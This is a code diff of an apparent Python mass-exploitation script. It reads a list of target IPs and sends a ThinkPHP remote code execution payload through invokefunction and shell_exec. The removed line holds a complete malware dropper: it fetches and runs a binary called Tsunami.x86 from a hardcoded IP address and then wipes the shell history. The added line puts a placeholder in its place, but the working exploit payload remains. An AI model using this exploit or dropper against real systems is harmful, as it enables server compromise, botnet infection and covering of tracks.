@@ -8,7 +8,7 @@ import requests
 from requests.auth import HTTPDigestAuth
 from decimal import *
 ips = open(sys.argv[1], "r").readlines()
-cmd = "/tmp/; curl http://185.244.25.168/OwO/Tsunami.x86; wget http://185.244.25.168/OwO/Tsunami.x86; chmod +x Tsunami.x86; ./Tsunami.x86 ThonkPHP; rm -rf Tsunami.x86; history -c"
+cmd = "/tmp/; SHELL_COMMAND_HERE; history -c"
 payload = "public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20"+cmd+""
 
 class load(threading.Thread):
